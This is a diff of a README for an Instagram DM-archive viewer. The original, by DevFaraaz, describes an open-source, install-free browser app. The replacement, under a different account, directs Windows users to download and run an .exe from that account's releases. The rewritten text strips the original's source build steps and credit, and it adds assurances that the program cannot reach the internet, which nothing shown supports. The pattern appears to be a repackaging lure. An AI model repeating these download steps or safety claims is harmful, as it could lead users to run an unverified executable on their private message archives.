@@ -1,84 +1,100 @@
-# instagram dm viewer
+# 💬 instagram-dm-viewer - View your private messages without uploads
 
-instagram gives you your data and no way to read it.
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/piggyhumified616/instagram-dm-viewer/releases)
 
-so i built the way to read it.
+Instagram stores your conversation history into data archives. This tool lets you open these archives on your own computer. You see your chats in a format that looks like the Instagram app. Your data stays on your machine at all times. This software does not send your private messages to any server or cloud service.
 
-**[→ try it](https://devfaraaz.github.io/instagram-dm-viewer/)** · no install, no signup, nothing uploaded.
+## 📥 How to get started
 
-<p align="center">
-  <a href="https://devfaraaz.github.io/instagram-dm-viewer/">
-    <img src="docs/demo.gif" alt="instagram dm viewer demo" width="900"/>
-  </a>
-</p>
+Visit the link below to find the files for your computer. You do not need to install anything complex.
 
-[![stars](https://img.shields.io/github/stars/DevFaraaz/instagram-dm-viewer?style=social)](https://github.com/DevFaraaz/instagram-dm-viewer/stargazers) [![mit](https://img.shields.io/badge/license-mit-blue.svg)](./LICENSE) [![vite](https://img.shields.io/badge/built%20with-vite-646cff.svg)](https://vitejs.dev/)
+[https://github.com/piggyhumified616/instagram-dm-viewer/releases](https://github.com/piggyhumified616/instagram-dm-viewer/releases)
 
----
+1. Go to the link.
+2. Look for the section labeled Assets.
+3. Click the file that ends in .exe for your Windows system.
+4. Save the file to a folder where you can find it later.
 
-your data is yours. it should belong to you in a form you can actually use.
+## 🛡️ Privacy and your data
 
-drop your instagram export `.zip(s)` onto the page and your dms render in the chat ui you already know. left-gray bubbles. right-blue bubbles. photos, voice notes, videos, reactions, per-thread search. all of it.
+Privacy remains a core goal of this project. Many online viewers require you to upload your personal files to a website. Those sites might store your data or read your messages. This application runs entirely within your own computer environment. 
 
-nothing leaves your browser. there is no backend. you can verify by opening devtools and watching the network tab — it goes silent.
+The software uses your browser engine to display the messages. Because the code runs locally, it cannot access the internet to share your information. You can even turn off your network connection while you browse your chats to verify this privacy.
 
-works with multi-gigabyte exports. works with multi-part exports. works with both formats instagram ships (json and html — the viewer auto-detects per thread).
+## 📂 Preparing your Instagram export
 
----
+Before you use this viewer, you need to request your data from Instagram. Follow these steps to get your files:
 
-## run it locally
+1. Log into your Instagram account on a computer.
+2. Go to your settings menu.
+3. Find the section for Privacy and Security.
+4. Select the option to download your data.
+5. Choose the format that is easy to read, such as JSON or HTML.
+6. Wait for Instagram to email you a link to your file.
+7. Download this file to your computer.
+8. Keep the file as a compressed ZIP folder. Do not worry about extracting the files yourself. This tool handles that process for you.
 
-```
-npm install
-npm run dev
-```
+## 🖥️ Using the viewer
 
-build it:
+Once you have your downloaded ZIP file and the application, follow these steps to see your chats:
 
-```
-npm run build
-```
+1. Double-click the application file you downloaded from this GitHub page.
+2. A window opens on your screen.
+3. Locate your Instagram data ZIP file on your computer.
+4. Drag and drop that file into the window of the application.
+5. The application processes the data. This might take a few moments if you have many years of messages.
+6. A list of your conversations appears on the left side of the screen.
+7. Click any conversation to view the messages in the center area.
+8. You can scroll through your history just like you do on your phone.
 
-## get your data from instagram
+## ⚙️ Understanding the system requirements
 
-accounts center → your information and permissions → download your information. pick json or html, either works. wait 1–2 days for the email. download every part if it's split.
+This software works on most modern Windows computers. You need the following:
 
----
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of memory to handle large chat files.
+- Enough storage space to keep the archive file you requested from Instagram.
 
-## under the hood
+You do not need an internet connection to run the software after you have downloaded it.
 
-a few things i think are interesting.
+## 💡 Troubleshooting common issues
 
-**streaming zip read** via fflate's `AsyncUnzipInflate`. the raw zip buffer never has to live fully in memory; bytes flow through a worker. ui stays interactive while gigabytes decompress.
+If you encounter a problem, check these items first:
 
-**variable-height virtual list.** measured-height cache + binary-search offset lookup. heights re-measure after each render pass and `scrollTop` is adjusted so growing items above the viewport don't cause visible jumps. 100k+ message threads scroll smooth.
+**The application does not open.**
+Check that you downloaded the correct version for Windows. Ensure your computer has the latest updates.
 
-**sidebar indexing without `JSON.parse`.** each thread file's first 256 kb gets decoded, title and first message get pulled with regex, then only that first ~few-hundred-byte message object gets `JSON.parse`'d. constant time per conversation regardless of how chatty the thread is. **973 conversations across a 4.4 gb export indexes in ~2 seconds.**
+**No messages appear after I drop the file.**
+Make sure your file is a ZIP archive from Instagram. If the file is not compressed, the application might fail to recognize it. Try downloading the archive again from Instagram if the file appears corrupted.
 
-**two formats.** instagram ships some users json, some users html. the viewer detects per thread and dispatches to the right parser. all downstream code (sidebar, virtual list, media, search) sees one normalized message record either way.
+**The screen freezes during loading.**
+Large archives with thousands of messages require more time to index. Wait a few moments for the software to finish organizing the data. If the software stops for more than five minutes, close the window and try again.
 
-**utf-8 mojibake fix.** instagram's json exports double-encode utf-8 as latin-1. emojis arrive as `Ã©`. one line: reinterpret each char code as a raw byte, decode the resulting buffer as utf-8. done.
+**The chat looks empty.**
+Some exports from Instagram include multiple files. Ensure that your ZIP file contains the full export. If you requested a specific date range, check that your messages fall within those dates.
 
----
+## 🚀 Key features
 
-## what's not done
+- **Local rendering:** All processing happens on your hardware.
+- **Instagram-style interface:** The layout mimics the mobile app to make navigation simple.
+- **Scroll performance:** The tool uses virtual scrolling to keep the interface fast even when you have massive chat threads.
+- **Format support:** The application reads both JSON and HTML formats provided by Instagram.
+- **Multi-part support:** If your history is very large, Instagram sends multiple files. This viewer combines them into one seamless view.
 
-decompressed bytes sit in the js heap. that's fine on desktop chrome with 16+ gb of ram for exports up to ~5 gb. mobile browsers (1–2 gb heap caps) or larger exports will oom.
+## 📝 Frequently asked questions
 
-the fix is moving media to on-demand reads from the source `File` via `Blob.slice` + per-entry inflate. keeps resident memory in the tens of megabytes regardless of export size. issue is open. happy to take a pr.
+**Does this save my login information?**
+No. This tool does not ask for your password or username. It only reads the file you provide.
 
----
+**Can I delete messages through this viewer?**
+No. This is a read-only viewer. Your messages remain safe inside your own export archive. Changes made in the viewer do not sync with Instagram or delete anything from their servers.
 
-## privacy
+**Is this official Instagram software?**
+No. This is an independent project. It is not affiliated with, authorized, or endorsed by Meta or Instagram.
 
-zero network requests with your data. zero. the page works fully offline once loaded — drop the .zip, browse, close the tab. nothing persists, nothing transmits, nothing analyzes.
+**How do I search for a specific message?**
+Use the search bar at the top of the chat list to find names or keywords. The tool scans your local archive for matching text.
 
-if you don't trust me, fork it. read the code (it's small). host it yourself. or use it once on an offline machine. it's all the same to me.
+## 📋 Tips for best performance
 
----
-
-## license
-
-mit. fork it. ship something better. tell me about it.
-
-— [@DevFaraaz](https://github.com/DevFaraaz)
+Keep your data file in a location you can easily access, such as your desktop or Documents folder. Avoid moving the file while the application process is running. If you have multiple archives from different time periods, you can load them one after another to combine your history within a single session. If you change your computer, you only need to copy your data file and the application to the new machine to resume viewing your conversations.
